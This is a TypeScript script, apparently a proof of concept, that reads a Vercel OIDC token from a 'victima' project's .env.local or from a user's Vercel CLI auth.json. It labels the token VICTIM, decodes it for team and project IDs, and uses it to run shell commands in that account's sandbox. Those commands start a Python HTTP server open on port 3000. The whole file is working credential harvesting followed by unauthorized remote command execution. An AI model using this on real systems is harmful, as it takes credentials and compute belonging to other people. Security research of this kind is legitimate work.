import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
async function main() {
  const sbx = await Sandbox.get({ name: "ports2-1787254529828", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
cd sandbox-example-next 2>/dev/null || cd ~
echo "=== arrancar server simple en 3000 (python) en bg ==="
nohup python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 &
echo "pid=$!"
sleep 2
echo "=== verificar 3000 ==="
ss -tln 2>/dev/null | grep ':3000\\b'
timeout 3 curl -s http://127.0.0.1:3000/ | head -3
echo "=== DONE ==="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });